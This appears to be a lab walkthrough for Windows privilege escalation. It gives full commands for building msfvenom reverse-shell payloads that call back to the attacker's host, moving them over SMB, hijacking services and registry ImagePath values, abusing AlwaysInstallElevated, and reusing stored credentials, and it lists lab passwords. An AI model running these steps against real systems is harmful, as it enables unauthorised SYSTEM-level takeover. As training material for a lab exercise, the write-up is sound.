# Windows PrivEsc

<img width="1907" height="364" alt="image" src="https://github.com/user-attachments/assets/82f1df6e-1dca-4555-bfea-af1faf6f0869" />


>[!note]
> ### Connect to Target using `RDP srvice enabled`:
>
> ```ruby
> xfreerdp3 /u:user /p:password321 /cert:ignore /v:10.10.103.25
> ```
> Or
> ```ruby
> rdesktop 10.10.103.25 -u user -p password321
> ```
> #### `if winrm service is enabled` :
> ```ruby
> evil-winrm -i 10.10.103.25 -u user -p 'password321'
> ```
> #### `if SMB service is enabled` :
> ```ruby
> smbclient //MACHINE_IP/C$ -U user
> ```

- <details>
     <summary>Nmap Scan</summary>

  ```ruby
  nmap -sC -sV  10.10.103.25 
  ```
  
  **`output`**
  
  ```ruby
  PORT     STATE SERVICE       VERSION
  135/tcp  open  msrpc         Microsoft Windows RPC
  139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
  445/tcp  open  microsoft-ds  Windows Server 2019 Standard Evaluation 17763 microsoft-ds
  3389/tcp open  ms-wbt-server Microsoft Terminal Services
  |_ssl-date: 2025-09-08T19:27:18+00:00; -2s from scanner time.
  | ssl-cert: Subject: commonName=WIN-QBA94KB3IOF
  | Not valid before: 2025-09-07T18:56:41
  |_Not valid after:  2026-03-09T18:56:41
  | rdp-ntlm-info: 
  |   Target_Name: WIN-QBA94KB3IOF
  |   NetBIOS_Domain_Name: WIN-QBA94KB3IOF
  |   NetBIOS_Computer_Name: WIN-QBA94KB3IOF
  |   DNS_Domain_Name: WIN-QBA94KB3IOF
  |   DNS_Computer_Name: WIN-QBA94KB3IOF
  |   Product_Version: 10.0.17763
  |_  System_Time: 2025-09-08T19:27:08+00:00
  5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  |_http-title: Not Found
  |_http-server-header: Microsoft-HTTPAPI/2.0
  Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
  
  Host script results:
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  |_clock-skew: mean: 1h23m59s, deviation: 3h07m51s, median: -1s
  | smb-os-discovery: 
  |   OS: Windows Server 2019 Standard Evaluation 17763 (Windows Server 2019 Standard Evaluation 6.3)
  |   Computer name: WIN-QBA94KB3IOF
  |   NetBIOS computer name: WIN-QBA94KB3IOF\x00
  |   Workgroup: WORKGROUP\x00
  |_  System time: 2025-09-08T12:27:11-07:00
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required
  | smb2-time: 
  |   date: 2025-09-08T19:27:12
  |_  start_date: N/A
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 256.26 seconds
  ```
  
  - **`3389/tcp open  ms-wbt-server`** : That is mean `RDP service` is work
  - **`5985/tcp open  http`** : That is mean `WinRM HTTP service` is work
  - **`445/tcp  open  microsoft-ds`** : That is mean `SMB service` is work


     
  </details>



<details>
  <summary>Generate a Reverse Shell Executable</summary>

## 1. first Create **`Reverse Shell file`** on my kali device

```ruby
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

- **`msfvenom`** : Tool from Metasploit used to generate payloads.
- **`-p windows/x64/shell_reverse_tcp`** : Reverse shell type
- **`LHOST`** : Device IP that will recive the shell in this case will be my kali machine
- **`LPORT`** : port that shell will connect to it on kali
- **`-f exe`** : output file type `exe`
- **`-o reverse.exe`** : put the output in file call ``reverse.exe``

## 2. send reverse sell to windows

**`on kali Device open smb servrice on directory that have reverseshell file`**

```ruby
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```
### **`or it's alias`**

```ruby
impacket-smbserver kali . -smb2support
```



- **`kali`** : name share
- **`.`** : files that will avilable in the share here in current folder
- **`-smb2support`** : It makes the server support the SMBv2 protocol (important because modern Windows often does not accept SMBv1).


**`on Windows Device`**

```ruby
copy \\10.8.47.102\kali\reverse.exe C:\PrivEsc\reverse.exe
```

- copy file from kali machine to windows


---

<img width="638" height="147" alt="image" src="https://github.com/user-attachments/assets/0fb8c918-0b43-445d-81ce-ba68f457888f" />


<img width="1441" height="449" alt="image" src="https://github.com/user-attachments/assets/dce924e7-a87f-4dff-af42-349654bc9647" />

- **`that is mean file is copied to windows`**

---

### **`now run the reverse file on windows with lesten on port 4444 on kali`**

<img width="715" height="307" alt="image" src="https://github.com/user-attachments/assets/6c150d81-145e-4b5f-b16d-8985d3ffaf89" />

- **`here we go we receved the shell `**


  
</details>









<details>
  <summary>Service Exploits</summary>




- <details>
      <summary>🟦Understanding</summary>

  
  ## ``1. know all services that work on system and it's privileges``
  
  # **`CMD`**
  
  ```ruby
  sc query type= service state= all
  ```
  
  # **`PowerShell`**
  
  ```ruby
  Get-Service | Select-Object Name, Status, StartType
  ```
  
  
  ---
  ---
  
  ## ``2. know the privilges of the user on each service``
  
  ```ruby
  accesschk.exe -uwcqv user *
  ```
  
  > you must download **`accesschk.exe`**
  > 

  https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk

  <details>
    <summary>send it to vectem</summary>
  
  ## **`using SMB`**
  
  **`on kali`**
  
  ```ruby
  sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
  
  ```
  
  **`on windows`**
  
  ```ruby
  copy \\10.10.10.10\kali\accesschk.exe C:\PrivEsc\accesschk.exe
  ```
  
  ----
  ----
  
  ## **`using Powershell`**
  
  **`on windows`** if device connected to internet
  
  ```ruby
  Invoke-WebRequest -Uri "http://10.10.10.10/accesschk.exe" -OutFile "C:\PrivEsc\accesschk.exe"
  ```
  
  **`on kali`**
  
  ```ruby
  python3 -m http.server 80
  ```
  
  
    
  </details>


  > by default it downloaded on this machine 





  ---
  ---
  
  ## 3. found the services that work as **`SYSTEM`**
  
  # **`CMD`**
  
  ```ruby
  sc qc <ServiceName>
  ```
  
  > - look at **`SERVICE_START_NAME`** value
  
  # **`PowerShell`**
  
  ```ruby
  Get-WmiObject Win32_Service | Select-Object Name, StartName
  ```


  </details>








- <details>
      <summary>Insecure Service Permissions</summary>

  
  > ### Goal is prevEsc form normal user to `SYSTEM privileges` by **`daclsvc`** service 
  
  ## 1. first check the pricvllage of current user on this service ``(daclsvc)``
  
  ```ruby
  C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
  ```
  
  - **`accesschk.exe`** : This is Tool form _Sysinternals_ to check on privilege of current user on (files, folders, etc...)
  - **`/accepteula`** : this option to pybaass the first priv window
  - **`-uwcqv`** : options
    - **`u`** : user account
    - **`w`** : writeing privileges
    - **`c`** : change `config` privileges
    - **`q`** : `quiet` to make it simple
    - **`v`** : `verbose` for more details
  - **`user`** : username of current user
  - **`daclsvc`** : service name
      
  
  ---
  
  <img width="584" height="296" alt="image" src="https://github.com/user-attachments/assets/c8ab3ba2-ad0a-4c86-99e3-ace3b7ce30fb" />
  
  ### - **`Found that user have`** :
  
  ```ruby
  SERVICE_CHANGE_CONFIG
  ```
  ### - ``Thats mean this user can change settings of this service``
  
  
  ---
  
  ## 2. now we want to know privileges of the current service
  
  ```ruby
  sc qc daclsvc
  ```
  
  - **`sc qc`** : query config for service
  - **`daclsvc`** : name of the service
  
  ---
  
  <img width="860" height="319" alt="image" src="https://github.com/user-attachments/assets/abec5e68-4f0c-439c-933e-79bc3f289979" />
  
  ### - we found :
  
  - **`SERVICE_START_NAME`** : the account that this service work with it
  - **`LocalSystem`** : that is mean if we run this service any program will run as **`SYSTEM`**
  
  
  
  ---
  
  > ### NOW WE know that :
  > - this service can work as **`SYSTEM`**
  > - current user can edit this service settings **`SERVICE_CHANGE_CONFIG`**
  
  
  ## 3. change the path of this service to path of our reverse shell that will send shell to kali with **`SYSTEM`** privileges : 
  
  ```ruby
  sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
  ```
  
  - **`sc config`** : change service settings
  - **`binpath=`** : the new path to that service will run it
  - **`\"C:\PrivEsc\reverse.exe\`** : reverse shell that we sent it before
  
  
  ### **`lesten on port 4444 on kali`**
  
  ### **`run the service`**
  
  <img width="677" height="212" alt="image" src="https://github.com/user-attachments/assets/ad7a133f-2592-45ba-9083-47dfb2ed716b" />
  
  ---
  
  ## receved the shell :
  
  <img width="719" height="210" alt="image" src="https://github.com/user-attachments/assets/7d36208c-ce01-4047-9eaf-04c855830e50" />
  
  ---
  
  ## see that we now **`SYSTEM`** user
  
  ```ruby
  whoami
  ```
  
  <img width="327" height="79" alt="image" src="https://github.com/user-attachments/assets/64e23bed-3b42-4219-8714-a256a4f0db96" />
  
  <details>
    <summary>more commands</summary>
  
  
  ## to see our privilleges
  
  ```ruby
  whoami /priv
  ```
  <img width="1282" height="624" alt="image" src="https://github.com/user-attachments/assets/a65ceb03-b5b5-4c09-a2fc-a2214f0ef8fc" />
  
  
  ## see the groups that i'm in : 
  
  ```ruby
  whoami /groups
  ```
  
  <img width="1158" height="249" alt="image" src="https://github.com/user-attachments/assets/c2689996-2809-4a2d-bec0-9508e3c0a142" />
  
  ```ruby
  systeminfo
  ```
  
  <img width="796" height="599" alt="image" src="https://github.com/user-attachments/assets/1ec7bb31-9838-41fd-8872-ffe6e0b1d56c" />
  
  ## to show all env variables: 
  
  ```ruby
  set
  ```
  
  <img width="1403" height="554" alt="image" src="https://github.com/user-attachments/assets/5a9fa26d-e836-4fe0-9ada-2372d7e46a96" />
  
  
    
  </details>
  
  
  > ## now the answer of the question :
  > What is the original BINARY_PATH_NAME of the daclsvc service?
  
  ```ruby
  sc qc daclsvc
  ```
  
  <img width="860" height="319" alt="image" src="https://github.com/user-attachments/assets/abec5e68-4f0c-439c-933e-79bc3f289979" />
  
  **`answer`**
  
  ```ruby
  C:\Program Files\DACL Service\daclservice.exe
  ```
  


  </details>













- <details>
      <summary>Unquoted Service Path</summary>

     
     
     > ## in windows each service has :
     > - **`BINARY_PATH_NAME`** : THE path with refer to the place that have **`exe`** that this service will run it
     >   - if it's value writen without ``"..."`` that mean we can exploit it
     
     
     ---
     
     ## 1. first get info about the service (unquotedsvc)
     
     ```ruby
     sc qc unquotedsvc
     ```
     
     ## - found two important things
     
     > - **`SERVICE_START_NAME : LocalSystem`** : that is mean this service work as **`SYSTEM`**
     > - **`BINARY_PATH_NAME        : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`**
     >>  - IT without ``"..."``
     
     
     <img width="883" height="262" alt="image" src="https://github.com/user-attachments/assets/888cae7d-e707-4a32-bf40-02b668d079b5" />
     
     ---
     
     ## 2. TRY To know the privilege of current user on this path
     
     ```ruby
     C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
     ```
     
     ## - **`RW BUILTIN\Users`** : that is mean any normal user can do read and write in this folder
     
     
     <img width="823" height="173" alt="image" src="https://github.com/user-attachments/assets/418384ed-aeff-4838-91b8-966a9933ba4d" />
     
     
     ---
     
     ## 3. move the reverse shell file to the new path with new name 
     
     
     ```ruby
     copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
     ```
     
     <img width="778" height="82" alt="image" src="https://github.com/user-attachments/assets/28249e57-c476-4664-b89f-7b136ef20544" />
     
     
     
     ## 4. open listener on kali
     
     ```ruby
     sudo nc -nvlp 4444
     ```
     
     ## 5. run the service 
     
     ```ruby
     net start unquotedsvc
     ```
     
     <img width="963" height="412" alt="image" src="https://github.com/user-attachments/assets/5b8eaba2-2421-4e4d-9d67-96e604910b74" />
     
     ---
     
     <img width="1646" height="214" alt="image" src="https://github.com/user-attachments/assets/c25163f8-d4d4-4446-94b9-6398e62bcc7d" />
     



  </details>















- <details>
      <summary> Weak Registry Permissions</summary>

     
     
     > ## in windows each service has settings stored in `Registry` like:
     > - **`SERVICE_START_NAME`** : who run the service
     > - **`BINARY_PATH_NAME`** : the excutable file that run when this service run
     
     
     ## 1. first get info about the service (regsvc):
     
     ```ruby
     sc qc regsvc
     ```
     
     ```c
       BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
       SERVICE_START_NAME : LocalSystem
     ```
     
     
     <img width="836" height="255" alt="image" src="https://github.com/user-attachments/assets/5019fb82-41c1-45f7-8983-dcd88310af44" />
     
     
     ## 2. check the privilege of this user to wirte on **`Registry`**
     
     ```ruby
     C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
     ```
     
     ```perl
     RW NT AUTHORITY\INTERACTIVE
           KEY_ALL_ACCESS
     ```
     
     ### - `that is mean any user have access to write on registry key of this service`
     
     
     <img width="797" height="192" alt="image" src="https://github.com/user-attachments/assets/88afff65-8a8a-4eaf-b3ad-ddc0cfedfbe0" />
     
     
     
     ## 3. edit Registry value and make it refer to our reverseshell file
     
     ```ruby
     reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
     ```
     
     - **`/v ImagePath`** : It determines that we change this particular value.
     - **`/t REG_EXPAND_SZ`** : Value type (String extended).
     - **`/d C:\PrivEsc\reverse.exe`** : New data (new path).
     - **`/f`** : (to not ask you for confirmation).
      
     
     ## 4. open Listener on kali
     
     ```ruby
     nc -nvlp 4444
     ```
     
     
     ## 5. run the service
     
     ```ruby
     net start regsvc
     ```
     
     
     <img width="995" height="568" alt="image" src="https://github.com/user-attachments/assets/0ae50a32-d149-46f3-98a6-4e17d9175224" />
     


     <details>
        <summary>الفرق بين daclsvc و regsvc Exploits</summary>
     
     
     
     
     
     ## الفرق بين daclsvc و regsvc Exploits
     
     
     الـ 2 إكسبلويت شبيهين في النتيجة (تشغيل ملفنا كـ SYSTEM)، لكن الاختلاف في **إيه اللي اتحكمنا فيه وإزاي**:
     
     ### 1️⃣ أول exploit (daclsvc)
     
     الأوامر:
     
     ```cmd
     sc qc daclsvc
     sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
     net start daclsvc
     ```
     
     * الخدمة أصلاً كانت بتشاور على ملف EXE في الـ `binpath`.
     * اليوزر عنده **SERVICE\_CHANGE\_CONFIG** → يقدر يعدّل إعدادات الخدمة باستخدام `sc config`.
     * غيّرنا الـ **binpath** بتاع الخدمة وخليّناه يشاور على ملفنا (reverse.exe).
     * لما شغّلنا الخدمة → الملف بتاعنا اتنفذ كـ SYSTEM.
     
     **الخلاصة**: استغلال صلاحية "تغيير إعدادات الخدمة" (config).
     
     ### 2️⃣ تاني exploit (regsvc)
     
     الأوامر:
     
     ```cmd
     accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
     reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
     net start regsvc
     ```
     
     * الخدمة (regsvc) بتشاور على المسار بتاعها من الريجستري (`ImagePath`).
     * عندنا صلاحية **كتابة على مفتاح الريجستري** ده (مش config بتاع الخدمة نفسها).
     * بدلنا قيمة الـ `ImagePath` في الريجستري وخليّناه يشاور على `reverse.exe`.
     * لما شغّلنا الخدمة → برضه ملفنا اتنفذ كـ SYSTEM.
     
     **الخلاصة**: استغلال صلاحية "كتابة في الريجستري" بدل "تغيير إعدادات الخدمة".
     
     ### الفرق الرئيسي:
     
     * **daclsvc**: عدّلنا إعدادات الخدمة باستخدام أمر `sc config` (بسبب صلاحية خدمة).
     * **regsvc**: عدّلنا **الريجستري** اللي الخدمة بتسحب منه الإعدادات (بسبب صلاحية على الريجستري).
     
     ---
     
     ## جدول مقارنة بين أنواع Service Exploits
     
     | نوع الاستغلال                 | المكان/الصلاحية المطلوب  | الطريقة                              | النتيجة                               |
     | ----------------------------- | ------------------------ | ------------------------------------ | ------------------------------------- |
     | DACL / Config Exploit         | SERVICE\_CHANGE\_CONFIG  | sc config تغيير binpath              | تشغيل ملف كـ SYSTEM                   |
     | Registry Exploit              | Write على Registry       | reg add لتغيير ImagePath             | تشغيل ملف كـ SYSTEM                   |
     | Unquoted Path Exploit         | Write على مجلد الخدمة    | وضع ملف باسم معين داخل مجلد غير مقفل | تشغيل الملف بصلاحيات SYSTEM عند start |
     | AlwaysInstallElevated Exploit | سياسات Windows Installer | تثبيت MSI خبيث                       | تشغيل كـ SYSTEM                       |
     | Weak Service Permissions      | أذونات ضعيفة على الخدمة  | sc config / binpath                  | تشغيل كـ SYSTEM                       |
     
     *ملاحظة*: كل الطرق السابقة تعتمد على أن الخدمة تعمل تحت SYSTEM أو حساب عالي الصلاحيات.
     
     
     ---


     # Windows Service Paths Explained
     
     ## 1️⃣ BINARY_PATH_NAME
     - ده الـ **path الحقيقي** للـ executable اللي السيرفيس هيشغله.
     - لما تعمل `sc config <service> binpath= "..."`، أنت فعليًا بتغير **المكان اللي النظام هيشغل منه البرنامج**.
     - أي تغيير هنا بيأثر على السيرفيس فورًا بعد إعادة التشغيل.
     
     ## 2️⃣ ImagePath
     - ده موجود في **Registry** تحت المسار:
       ```
       HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<ServiceName>
       ```
     - القيمة دي هي نفسها `BINARY_PATH_NAME`، لأنها مجرد **طريقة Windows لتخزين path السيرفيس** في الريجستري.
     - عمليًا هما بيشاوروا لنفس الملف، لكن `ImagePath` موجود في الريجستري، و`BINARY_PATH_NAME` بيشتغل بيه `sc.exe`.
     
     ## 3️⃣ العلاقة بينهم
     - لو غيرت `BINARY_PATH_NAME` عن طريق `sc config` → النظام بيحدث الـ `ImagePath` في الريجستري تلقائي.
     - لو غيرت `ImagePath` مباشرة في الريجستري → السيرفيس مش هيعرف لحد ما تعمله restart أو تستخدم `sc` لتحديثه.
     
     ## 4️⃣ ليه في Exploit غيرنا `binpath`؟
     - الهدف كان **تشغيل الـ reverse shell الخاص بينا كخدمة**.
     - الأمر المستخدم:
       ```
       sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
       ```
     - ده بيخلي السيرفيس يشتغل بالـ executable بتاعنا بدل الأصلي.
     - وده أساسي في **privilege escalation** على Windows لأن السيرفيس بيشتغل بـ SYSTEM privileges.
     
     ## مثال تشبيهي
     - تخيل عندك دفتر (Registry) وورقة (BINARY_PATH_NAME) فيها نفس الرقم:
       - لو كتبت الرقم في الورقة → الدفتر بيتحدث تلقائي.
       - لو كتبت الرقم في الدفتر بس → الورقة مش هتعرف إلا لما تقول لها "حدّثي نفسك" (restart أو `sc`).
     
     
          
     
     
     
     
     </details>






  </details>














- <details>
      <summary>Insecure Service Executables</summary>

     
     ## 1. Query the service configuration
     
     ```ruby
     sc qc filepermsvc
     ```
     
     - **`sc`** : `(Service Control)` Tool in windows
     - **`qc`** : `(Query Configuration)` to get service settings
     
     ---
     
     ```ruby
             BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
             SERVICE_START_NAME : LocalSystem
     ```
     
     
     <img width="856" height="276" alt="image" src="https://github.com/user-attachments/assets/8def86f3-a0a7-4c06-9e67-bd75f5a2f2ba" />
     
     ---
     
     ## 2. Check file permissions with accesschk
     
     ```ruby
     C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
     ```
     
     - **`accesschk.exe`** : Tool from _Sysinternals_
     - **`/accepteula`** : It means "I agree to the user agreement" (required the first time).
     - **`-quvw`**
        - **`q`** : quiet
        - **`u`** : show user-specific permissions
        - **`v`** : `verbose` More detail
        - **`w`** : It focuses on write permissions (who has the authority to write to the file).
     - **`"C:\Program Files\File Permissions Service\filepermservice.exe"`** : The file whose permissions we want to see.
     
     ---
     
     ```ruby
      RW Everyone
             FILE_ALL_ACCESS
     ```
     
     ### - `🚨 that is mean every one on this system They have almost all the permissions on the file (read, write, modify, delete...).`
     
     
     
     <img width="923" height="268" alt="image" src="https://github.com/user-attachments/assets/71ec6c24-5cf3-4433-91dd-595bb89f31d8" />
     
     
     
     ## 3. Replace the service binary
     
     
     ```ruby
     copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
     ```
     
     - **`copy`** : File copy command.
     - **`C:\PrivEsc\reverse.exe`** : The reverse shell we created (our malicious file).
     - **`"C:\Program Files\File Permissions Service\filepermservice.exe"`** : The original file of the service.
     - **`/Y`** : He lets the copying happen without asking you, “Are you sure you want to overwrite?”
     
     
     <img width="886" height="135" alt="image" src="https://github.com/user-attachments/assets/549d2f3a-bbfa-478d-8937-8b2065bd3199" />
     
     
     ## 4. Start listener on Kali
     
     ```ruby
     nc -lvnp 4444
     ```
     
     ## 5. Start the service
     
     ```ruby
     net start filepermsvc
     ```
     
     - **`net`** : A Windows tool for managing networks and services.
     - **`start`** : Service run command.
     - **`filepermsvc`** : service name
     
     
     <img width="1003" height="272" alt="image" src="https://github.com/user-attachments/assets/9898c0ad-670a-4870-aa16-862b6406cdb2" />
     
     



  </details>
  



  
</details>












<details>
  <summary>Registry</summary>



- <details>
     <summary>AutoRuns</summary>

     
     
     ## 1. Query the registry for AutoRun executables
     
     ```ruby
     reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
     ```
     
     - **`reg`** : A tool for managing the registry in Windows (query, add, delete...).
     - **`query`** : It means "View the contents of the key" (read only).
     - **`HKLM`** : HKEY_LOCAL_MACHINE shortcut (part of the registry that stores system settings for all users).
     - **`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`** : The key that stores programs that start automatically when the system starts (Autoruns).
     
     
     <img width="728" height="147" alt="image" src="https://github.com/user-attachments/assets/16f69e3c-fea4-4bb8-96e5-fefde26211f3" />
     
     ```ruby
           "C:\Program Files\Autorun Program\program.exe"
     ```
     
     
     > ---
     > ### 📌 _The goal is to see which programs start automatically with every restart or login._
     > ---
     
     ## 2. Check file permissions with AccessChk
     
     
     ```ruby
     C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
     ```
     
     - **`accesschk.exe`** : Tool from _Sysinternals_
     - **`/accepteula`** : It means "I agree to the user agreement" (required the first time).
          - **`-uvw`**
             - **`u`** : show user-specific permissions
             - **`v`** : `verbose` More detail
             - **`w`** : It focuses on write permissions (who has the authority to write to the file).
     - **`"C:\Program Files\Autorun Program\program.exe"`** : The executable file of the program that runs automatically.
     
     
     <img width="782" height="350" alt="image" src="https://github.com/user-attachments/assets/17076342-3a83-4c72-b480-87831a635f8d" />
     
     ```ruby
      RW Everyone
             FILE_ALL_ACCESS
     ```
     
     
     > ---
     > ### 📌 _The goal → Check if this file is writable by any user (Everyone or BUILTIN\Users). If ah → this is a big weakness._
     > ---
     
     
     ## 3. Overwrite the AutoRun executable
     
     ```ruby
     copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
     ```
     
     <img width="799" height="84" alt="image" src="https://github.com/user-attachments/assets/083692ef-67ad-4936-902c-7a9e67ff94e1" />
     
     
     > ---
     > ### 📌 _Goal → Replace the program that runs automatically (program.exe) with our reverse shell._
     > ---
     
     
     ## 4. Start a listener on Kali
     
     ```ruby
     nc -lvnp 4444
     ```
     
     
     ## 5. Open a new RDP session to trigger
     
     ```ruby
     rdesktop 10.10.110.227
     ```
     
     > login with 
     
     ```css
     admin : password123
     ```
     
     <img width="515" height="291" alt="image" src="https://github.com/user-attachments/assets/a961e489-b99d-4bc2-b54b-b2f3e9a001f8" />
     
     ---
     
     <img width="1563" height="800" alt="image" src="https://github.com/user-attachments/assets/28d8261b-470d-49f0-a6f4-fdf1f704b37a" />
     
     
     > ---
     > ### 📌 _Shell will return with the privileges of the user who loged in_
     > ---
     

  </details>









- <details>
     <summary>AlwaysInstallElevated</summary>
     
     
     ## 1. Query the registry for AlwaysInstallElevated keys
     
     ```ruby
     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     ```
     
     - **`reg`** : A tool for managing the registry in Windows (query, add, delete...).
     - **`query`** : It means "View the contents of the key" (read only).
     - **`HKLM`** : HKEY_LOCAL_MACHINE shortcut (part of the registry that stores system settings for all users).
     - **`HKCU`** : HKEY_CURRENT_USER shortcut (settings specific to the current user).
     - **`\SOFTWARE\Policies\Microsoft\Windows\Installer`** : Path to Windows Installer settings.
     - **`/v AlwaysInstallElevated`** : It means "Show me the value of the entry called `AlwaysInstallElevated`".
     
     <img width="846" height="236" alt="image" src="https://github.com/user-attachments/assets/d9c6095b-91f8-481b-993e-ddd252f7b347" />
     
     
     > ---
     > ### 📌 _Goal → Make sure that the two keys are present and set to 1 `(0x1)` → if yes That is mean any ``MSI package`` can be installed with `SYSTEM privileges`._
     > ---
     
     
     ## 2. Generate malicious MSI with msfvenom (on Kali)
     
     
     ```ruby
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.47.102 LPORT=4444 -f msi -o reverse.msi
     ```
     
     - **`msfvenom`** : Tool from Metasploit used to generate payloads.
     - **`-p windows/x64/shell_reverse_tcp`** : Reverse shell type
     - **`LHOST`** : Device IP that will recive the shell in this case will be my kali machine
     - **`LPORT`** : port that shell will connect to it on kali
     - **`-f msi`** : output file type `msi`
     - **`-o reverse.msi`** : put the output in file call ``reverse.msi``
     
     
     > ---
     > ### 📌 _Goal → Create a malicious MSI file that opens Reverse Shell._
     > ---
     
     
     ## 3. Transfer the MSI to Windows
     
     **`on kali`**
     
     ```ruby
     impacket-smbserver frank . -smb2support
     ```
     
     **`on windows`**
     
     ```ruby
     copy \\10.8.47.102\frank\reverse.msi C:\PrivEsc\
     ```
     
     <img width="1799" height="528" alt="image" src="https://github.com/user-attachments/assets/67da4d1c-c81c-4fd5-9cda-07fc681b94d5" />
     
     
     
     ## 4. Start a listener on Kali
     
     ```ruby
     nc -lvnp 4444
     ```
     
     
     ## 5. Run the malicious MSI on Windows
     
     ```ruby
     msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
     ```
     
     - **`msiexec`** : Windows Installer (responsible for installing .msi).
     - **`/quiet`** : install program without any GUI or popups.
     - **`/qn`** : Same idea (Quiet with No UI).
     - **`/i`** : install package
     - **`C:\PrivEsc\reverse.msi`** : The file we want to install.
     
     > ---
     > ### 📌 _Goal → Since `AlwaysInstallElevated=1` in `HKLM and HKCU` → any MSI installed will be installed as SYSTEM.Therefore, our reverse shell runs directly with SYSTEM privileges._
     > ---
     
     
     <img width="1299" height="269" alt="image" src="https://github.com/user-attachments/assets/dacdf0e5-a030-40cb-a0bf-983259fa7f6d" />
     
     
     



  </details>



     
</details>

















<details>
  <summary>Passwords</summary>




- <details>
     <summary>Registry</summary>

     
     >[!note]
     > **`(For some reason sometimes the password does not get stored in the registry. If this is the case, use the following as the answer: password123)`**
     
     
     ## 1. Search for the word "password" in the registry
     
     ```ruby
     reg query HKLM /f password /t REG_SZ /s
     ```
     
     - **`reg`** : A tool for managing the registry in Windows (query, add, delete...).
     - **`query`** : It means "View the contents of the key" (read only).
     - **`HKLM`** : HKEY_LOCAL_MACHINE shortcut (part of the registry that stores system settings for all users).
     - **`/f password`** : /f means “filter” → Here we look for the text “password”.
     - **`/t REG_SZ`** : This means looking for values ​​of type string.
     - **`/s`** : `search recursively` (Searches all subkeys)
     
     
     > ---
     > ### 📌 _Goal → To see if anywhere in the registry there is a password stored in plain text._
     > ---
     
     
     ## 2. Search directly for AutoLogon key
     
     
     ```ruby
     reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
     ```
     
     - It goes directly to Winlogon key.
     - In some systems, this contains values ​​like:
        - **`DefaultUserName`**
        - **`DefaultPassword`**
        - **`AutoAdminLogon`**
     
     <img width="971" height="611" alt="image" src="https://github.com/user-attachments/assets/a727bcec-3976-4a4b-a097-53c290ca3265" />
     
          
     
     > ---
     > ### 📌 _Goal → To access the stored admin username and password so that the system performs an automatic login._
     > ---
     
     
     ## 3. Executing a command on the system using Winexe
     
     ```ruby
     winexe -U 'admin%password' //10.10.194.107 cmd.exe
     ```
     
     - **`winexe`** : A tool that allows you to run commands on a Windows machine from a remote Linux machine (similar to PsExec).
     - **`-U 'admin%password'`** :
        - **`-U`** : user
        - **`'admin%password'`** : Here we specify the username and password in the form `username%password`.
          - **`Example`** : `'admin%password123'`.
     - **`cmd.exe`** : The program we want to run on the target device (here is the command prompt).
     
     
     <img width="919" height="322" alt="image" src="https://github.com/user-attachments/assets/b1522bdc-bc17-4ef9-94ac-fa01a0d493c1" />
     
     
     
     
     > ---
     > ### 📌 _Goal → Command Prompt will open for you with Administrator privileges on the target device while you are running Kali._
     > ---




  </details>









- <details>
     <summary>Saved Creds</summary>

     ## 1. View stored Credentials
     
     ```ruby
     cmdkey /list
     ```
     
     - **`cmdkey`** : A built-in Windows tool for managing Stored Credentials.
     - **`/list`** : display all credentials Saved in the system.
     
     <img width="624" height="286" alt="image" src="https://github.com/user-attachments/assets/d2523f9e-11b6-4c5c-a214-8cdb185886cb" />
     
     
     > ---
     > ### 📌 _Goal → To see if there is a user (such as admin) stored with its password in the Windows Vault._
     > ---
     
     <details>
          <summary>Note</summary>
     
     >[!Note]
     > #### _**`Note that credentials for the "admin" user are saved. If they aren't, run the`**_
     > ```ruby
     > C:\PrivEsc\savecred.bat script
     > ```
     > to refresh the saved credentials.
     
     > ## ``savecred.bat`` → A script on the lap that forces the system to store the credential (usually owned by the admin).
     > Objective: Make sure that the credential is registered so that we can exploit it.
     
          
     </details>
     
     
     ## 2. run payload using saved credential
     
     ```ruby
     runas /savecred /user:admin C:\PrivEsc\reverse.exe
     ```
     
     - **`runas`** : Tool to run programs as different user
     - **`/savecred`** : It means use the credential stored in the system instead of asking you to enter the password.
     - **`/user:admin`** : Specify that you want to run the program as a user named admin.
